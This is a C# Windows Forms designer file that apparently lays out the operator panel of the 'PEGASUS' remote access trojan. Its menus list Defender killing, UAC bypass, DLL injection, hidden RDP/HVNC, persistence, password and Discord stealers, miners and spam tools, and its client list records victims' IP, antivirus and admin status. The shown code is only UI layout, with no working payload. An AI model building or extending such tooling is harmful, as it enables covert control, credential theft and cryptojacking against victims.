using System;
using System.Drawing;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;

namespace PEGASUS.Design
{
    partial class PEGALISIUS
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            Guna.UI2.AnimatorNS.Animation animation4 = new Guna.UI2.AnimatorNS.Animation();
            Guna.UI2.AnimatorNS.Animation animation3 = new Guna.UI2.AnimatorNS.Animation();
            Guna.UI2.AnimatorNS.Animation animation2 = new Guna.UI2.AnimatorNS.Animation();
            Guna.UI2.AnimatorNS.Animation animation1 = new Guna.UI2.AnimatorNS.Animation();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(PEGALISIUS));
            this.contextMenuLogs = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.cLEARToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.contextMenuThumbnail = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.sTARTToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sTOPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
            this.tabControl1 = new System.Windows.Forms.TabControl();
            this.listView4 = new System.Windows.Forms.ListView();
            this.columnHeader4 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader5 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.guna2ContextMenuStrip2 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.toolStripMenuItem61 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem62 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem63 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem64 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem65 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem66 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem67 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem68 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem69 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem70 = new System.Windows.Forms.ToolStripMenuItem();
            this.listView2 = new System.Windows.Forms.ListView();
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.guna2ContextMenuStrip3 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.toolStripMenuItem48 = new System.Windows.Forms.ToolStripMenuItem();
            this.copySelectedToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem14 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem15 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem16 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem17 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem18 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem19 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem20 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem21 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem22 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem23 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem24 = new System.Windows.Forms.ToolStripMenuItem();
            this.guna2ContextMenuStrip1 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.tasksControlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.onToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.offToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.powershellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem5 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem6 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem81 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem7 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem8 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem9 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem10 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem11 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem12 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem76 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem77 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem79 = new System.Windows.Forms.ToolStripMenuItem();
            this.remoteReverseProxyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.protectionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem25 = new System.Windows.Forms.ToolStripMenuItem();
            this.sTARTEASYToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem26 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem54 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem55 = new System.Windows.Forms.ToolStripMenuItem();
            this.priviligeEscalationFirewallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uACExplotationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.windowsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.windowsToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.windows7ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.adminLoopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.disableUACToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.defeatFirewallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.killWindowsDefenderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem13 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem71 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem72 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem73 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem74 = new System.Windows.Forms.ToolStripMenuItem();
            this.executeVBSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.mergeRegToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.executebatToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem75 = new System.Windows.Forms.ToolStripMenuItem();
            this.dLLInjectionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.injectionPanelToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem78 = new System.Windows.Forms.ToolStripMenuItem();
            this.silentInstallerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.peToShellConverterToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.reverseProxyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ngrokToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.reverseProxyToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.stopNgrokToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem33 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem40 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem41 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem42 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem43 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem34 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem35 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem36 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem37 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem38 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem39 = new System.Windows.Forms.ToolStripMenuItem();
            this.hiddenRDPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.HRDPconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.addUserPEGASUSPEGASUSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.connectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.copyProfileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.HRDPcleanUnistallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.hVNChBrowsersToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.connectToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem49 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem50 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem51 = new System.Windows.Forms.ToolStripMenuItem();
            this.addPEGASUSSheduleTaskToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem52 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem53 = new System.Windows.Forms.ToolStripMenuItem();
            this.addPEGASUSToStartupToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.taskMgrDogToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startToolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
            this.stopToolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
            this.watchDogToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startToolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
            this.stopToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.hIDEPEGASUSPROCESSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem82 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem83 = new System.Windows.Forms.ToolStripMenuItem();
            this.passwordRecoveryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem31 = new System.Windows.Forms.ToolStripMenuItem();
            this.sKYNETToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.recoverAllSendToDiscordToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem80 = new System.Windows.Forms.ToolStripMenuItem();
            this.discordStealerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.kATANAToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.chromeExtentionStealerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem56 = new System.Windows.Forms.ToolStripMenuItem();
            this.cPUMinerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.stopToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.deleteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.gPUMinerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startToolStripMenuItem5 = new System.Windows.Forms.ToolStripMenuItem();
            this.stopToolStripMenuItem6 = new System.Windows.Forms.ToolStripMenuItem();
            this.deleteToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.remoteMinerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.MinerstartToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.MinerstopToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.spamToolsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sendEmailFromClientPCToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.webHookSpammerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.stopToolStripMenuItem5 = new System.Windows.Forms.ToolStripMenuItem();
            this.chatSpammerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem57 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem60 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem59 = new System.Windows.Forms.ToolStripMenuItem();
            this.pEGASUSBUILDERToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sKYNETSHOPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.openSupportTicketToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem58 = new System.Windows.Forms.ToolStripMenuItem();
            this.LISTVIEWTASKS = new System.Windows.Forms.Panel();
            this.guna2VScrollBar3 = new Guna.UI2.WinForms.Guna2VScrollBar();
            this.guna2VScrollBar2 = new Guna.UI2.WinForms.Guna2VScrollBar();
            this.guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2VSeparator4 = new Guna.UI2.WinForms.Guna2VSeparator();
            this.guna2VSeparator5 = new Guna.UI2.WinForms.Guna2VSeparator();
            this.panel2 = new System.Windows.Forms.Panel();
            this.panel3 = new System.Windows.Forms.Panel();
            this.guna2Transition1 = new Guna.UI2.WinForms.Guna2Transition();
            this.guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
            this.btnBinder = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2GradientButton5 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2GradientButton4 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2GradientButton3 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2GradientButton2 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2Separator6 = new Guna.UI2.WinForms.Guna2Separator();
            this.guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
            this.guna2Separator5 = new Guna.UI2.WinForms.Guna2Separator();
            this.guna2VSeparator2 = new Guna.UI2.WinForms.Guna2VSeparator();
            this.guna2VSeparator1 = new Guna.UI2.WinForms.Guna2VSeparator();
            this.LISTVIEWSPANEL1 = new Guna.UI2.WinForms.Guna2Panel();
            this.guna2TabControl1 = new Guna.UI2.WinForms.Guna2TabControl();
            this.tabPage1 = new System.Windows.Forms.TabPage();
            this.guna2VScrollBar4 = new Guna.UI2.WinForms.Guna2VScrollBar();
            this.listView1 = new System.Windows.Forms.ListView();
            this.lv_ip = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_country = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_group = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_cpugpu = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_gpuram = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_hwid = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_user = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_camera = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_os = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_version = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_ins = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_admin = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_av = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_ping = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.lv_act = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
            this.guna2Separator2 = new Guna.UI2.WinForms.Guna2Separator();
            this.label11 = new System.Windows.Forms.Label();
            this.label10 = new System.Windows.Forms.Label();
            this.label8 = new System.Windows.Forms.Label();
            this.chkSounds = new Guna.UI2.WinForms.Guna2ToggleSwitch();
            this.label4 = new System.Windows.Forms.Label();
            this.Listener = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.statusStrip1 = new System.Windows.Forms.StatusStrip();
            this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
            this.tabPage2 = new System.Windows.Forms.TabPage();
            this.tabPage3 = new System.Windows.Forms.TabPage();
            this.listView3 = new System.Windows.Forms.ListView();
            this.guna2ContextMenuStrip4 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.toolStripMenuItem27 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem28 = new System.Windows.Forms.ToolStripMenuItem();
            this.ThumbnailImageList = new System.Windows.Forms.ImageList(this.components);
            this.tabPage4 = new System.Windows.Forms.TabPage();
            this.HVNCList = new System.Windows.Forms.ListView();
            this.columnHeader6 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader7 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader8 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader9 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader10 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader11 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader12 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.imageList1 = new System.Windows.Forms.ImageList(this.components);
            this.guna2Panel4 = new Guna.UI2.WinForms.Guna2Panel();
            this.label15 = new System.Windows.Forms.Label();
            this.btnVisitUrl = new Guna.UI2.WinForms.Guna2GradientButton();
            this.btnRecover = new Guna.UI2.WinForms.Guna2GradientButton();
            this.btnKillChrome = new Guna.UI2.WinForms.Guna2GradientButton();
            this.btnresetScale = new Guna.UI2.WinForms.Guna2GradientButton();
            this.btnRemoveHvnc = new Guna.UI2.WinForms.Guna2GradientButton();
            this.btnAbouthvnc = new Guna.UI2.WinForms.Guna2GradientButton();
            this.btnUploadExec = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2Separator7 = new Guna.UI2.WinForms.Guna2Separator();
            this.guna2Panel3 = new Guna.UI2.WinForms.Guna2Panel();
            this.label14 = new System.Windows.Forms.Label();
            this.btnStopHvnc = new Guna.UI2.WinForms.Guna2GradientButton();
            this.btnStarthvnc = new Guna.UI2.WinForms.Guna2GradientButton();
            this.label13 = new System.Windows.Forms.Label();
            this.HVNCListenPort = new Guna.UI2.WinForms.Guna2TextBox();
            this.label12 = new System.Windows.Forms.Label();
            this.label9 = new System.Windows.Forms.Label();
            this.LISTVIEWSPANELSMALL2 = new Guna.UI2.WinForms.Guna2Panel();
            this.guna2ControlBox3 = new Guna.UI2.WinForms.Guna2ControlBox();
            this.guna2Separator4 = new Guna.UI2.WinForms.Guna2Separator();
            this.guna2ToggleSwitch1 = new Guna.UI2.WinForms.Guna2ToggleSwitch();
            this.guna2ControlBox2 = new Guna.UI2.WinForms.Guna2ControlBox();
            this.guna2Separator3 = new Guna.UI2.WinForms.Guna2Separator();
            this.label7 = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
            this.label1 = new System.Windows.Forms.Label();
            this.guna2PictureBox5 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2VSeparator3 = new Guna.UI2.WinForms.Guna2VSeparator();
            this.guna2VScrollBar1 = new Guna.UI2.WinForms.Guna2VScrollBar();
            this.miniToolStrip = new System.Windows.Forms.StatusStrip();
            this.LISTVIEWPANEL0 = new Guna.UI2.WinForms.Guna2ShadowPanel();
            this.guna2Transition2 = new Guna.UI2.WinForms.Guna2Transition();
            this.guna2NotificationPaint1 = new Guna.UI2.WinForms.Guna2NotificationPaint(this.components);
            this.loadForm = new Guna.UI2.WinForms.Guna2Transition();
            this.guna2Transition3 = new Guna.UI2.WinForms.Guna2Transition();
            this.guna2HtmlToolTip1 = new Guna.UI2.WinForms.Guna2HtmlToolTip();
            this.ping = new System.Windows.Forms.Timer(this.components);
            this.UpdateUI = new System.Windows.Forms.Timer(this.components);
            this.ConnectTimeout = new System.Windows.Forms.Timer(this.components);
            this.TimerTask = new System.Windows.Forms.Timer(this.components);
            this.performanceCounter1 = new System.Diagnostics.PerformanceCounter();
            this.performanceCounter2 = new System.Diagnostics.PerformanceCounter();
            this.imageList2 = new System.Windows.Forms.ImageList(this.components);
            this.contextMenuLogs.SuspendLayout();
            this.contextMenuThumbnail.SuspendLayout();
            this.guna2ContextMenuStrip2.SuspendLayout();
            this.guna2ContextMenuStrip3.SuspendLayout();
            this.guna2ContextMenuStrip1.SuspendLayout();
            this.LISTVIEWTASKS.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox1)).BeginInit();
            this.guna2Panel1.SuspendLayout();
            this.LISTVIEWSPANEL1.SuspendLayout();
            this.guna2TabControl1.SuspendLayout();
            this.tabPage1.SuspendLayout();
            this.guna2Panel2.SuspendLayout();
            this.statusStrip1.SuspendLayout();
            this.tabPage2.SuspendLayout();
            this.tabPage3.SuspendLayout();
            this.guna2ContextMenuStrip4.SuspendLayout();
            this.tabPage4.SuspendLayout();
            this.guna2Panel4.SuspendLayout();
            this.guna2Panel3.SuspendLayout();
            this.LISTVIEWSPANELSMALL2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox5)).BeginInit();
            this.LISTVIEWPANEL0.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.performanceCounter1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.performanceCounter2)).BeginInit();
            this.SuspendLayout();
            // 
            // contextMenuLogs
            // 
            this.guna2Transition3.SetDecoration(this.contextMenuLogs, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.contextMenuLogs, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.contextMenuLogs, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.contextMenuLogs, Guna.UI2.AnimatorNS.DecorationType.None);
            this.contextMenuLogs.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.contextMenuLogs.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cLEARToolStripMenuItem});
            this.contextMenuLogs.Name = "contextMenuLogs";
            this.contextMenuLogs.ShowImageMargin = false;
            this.contextMenuLogs.Size = new System.Drawing.Size(77, 26);
            // 
            // cLEARToolStripMenuItem
            // 
            this.cLEARToolStripMenuItem.Name = "cLEARToolStripMenuItem";
            this.cLEARToolStripMenuItem.Size = new System.Drawing.Size(76, 22);
            this.cLEARToolStripMenuItem.Text = "Clear";
            this.cLEARToolStripMenuItem.Click += new System.EventHandler(this.CLEARToolStripMenuItem_Click);
            // 
            // contextMenuThumbnail
            // 
            this.guna2Transition3.SetDecoration(this.contextMenuThumbnail, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.contextMenuThumbnail, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.contextMenuThumbnail, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.contextMenuThumbnail, Guna.UI2.AnimatorNS.DecorationType.None);
            this.contextMenuThumbnail.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.contextMenuThumbnail.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.sTARTToolStripMenuItem,
            this.sTOPToolStripMenuItem});
            this.contextMenuThumbnail.Name = "contextMenuStrip2";
            this.contextMenuThumbnail.Size = new System.Drawing.Size(99, 48);
            // 
            // sTARTToolStripMenuItem
            // 
            this.sTARTToolStripMenuItem.ForeColor = System.Drawing.SystemColors.ControlText;
            this.sTARTToolStripMenuItem.Name = "sTARTToolStripMenuItem";
            this.sTARTToolStripMenuItem.Size = new System.Drawing.Size(98, 22);
            this.sTARTToolStripMenuItem.Text = "Start";
            this.sTARTToolStripMenuItem.Click += new System.EventHandler(this.STARTToolStripMenuItem_Click);
            // 
            // sTOPToolStripMenuItem
            // 
            this.sTOPToolStripMenuItem.Name = "sTOPToolStripMenuItem";
            this.sTOPToolStripMenuItem.Size = new System.Drawing.Size(98, 22);
            this.sTOPToolStripMenuItem.Text = "Stop";
            this.sTOPToolStripMenuItem.Click += new System.EventHandler(this.STOPToolStripMenuItem_Click);
            // 
            // notifyIcon1
            // 
            this.notifyIcon1.BalloonTipText = "New client connected!";
            this.notifyIcon1.BalloonTipTitle = "PEGASUS";
            this.notifyIcon1.Icon = ((System.Drawing.Icon)(resources.GetObject("notifyIcon1.Icon")));
            this.notifyIcon1.Text = "PEGASUS";
            this.notifyIcon1.Visible = true;
            // 
            // tabControl1
            // 
            this.loadForm.SetDecoration(this.tabControl1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.tabControl1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.tabControl1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.tabControl1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.tabControl1.Location = new System.Drawing.Point(42, 282);
            this.tabControl1.Margin = new System.Windows.Forms.Padding(2);
            this.tabControl1.Name = "tabControl1";
            this.tabControl1.SelectedIndex = 0;
            this.tabControl1.Size = new System.Drawing.Size(1175, 257);
            this.tabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.tabControl1.TabIndex = 3;
            // 
            // listView4
            // 
            this.listView4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.listView4.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listView4.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader4,
            this.columnHeader5});
            this.listView4.ContextMenuStrip = this.guna2ContextMenuStrip2;
            this.guna2Transition3.SetDecoration(this.listView4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.listView4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.listView4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.listView4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.listView4.Dock = System.Windows.Forms.DockStyle.Left;
            this.listView4.ForeColor = System.Drawing.Color.LightGray;
            this.listView4.FullRowSelect = true;
            this.listView4.HideSelection = false;
            this.listView4.Location = new System.Drawing.Point(0, 0);
            this.listView4.Margin = new System.Windows.Forms.Padding(2);
            this.listView4.Name = "listView4";
            this.listView4.Size = new System.Drawing.Size(598, 747);
            this.listView4.TabIndex = 0;
            this.listView4.UseCompatibleStateImageBehavior = false;
            this.listView4.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader4
            // 
            this.columnHeader4.Text = "Task";
            this.columnHeader4.Width = 334;
            // 
            // columnHeader5
            // 
            this.columnHeader5.Text = "Run times";
            this.columnHeader5.Width = 150;
            // 
            // guna2ContextMenuStrip2
            // 
            this.guna2ContextMenuStrip2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2Transition1.SetDecoration(this.guna2ContextMenuStrip2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2ContextMenuStrip2, Guna.UI2.AnimatorNS.DecorationType.None);
